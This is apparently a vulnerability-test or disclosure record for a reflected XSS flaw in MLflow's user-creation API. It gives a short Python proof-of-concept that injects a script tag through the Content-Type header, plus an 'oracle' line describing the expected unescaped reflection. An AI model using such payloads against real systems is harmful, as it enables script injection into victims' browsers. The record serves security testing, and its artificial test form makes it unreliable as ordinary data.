title: Reflected XSS in MLflow due to unsanitized Content-Type header in error response
trigger_payload:
from requests import post
url = 'http://127.0.0.1:5000/api/2.0/mlflow/users/create'
headers = {
'Content-Type': '<script>alert(document.domain)</script>',
}
resp = post(url, headers=headers).text
print(resp)
oracle: The server returns an error message containing the unescaped malicious script in the Content-Type header, which executes in the victim's browser.
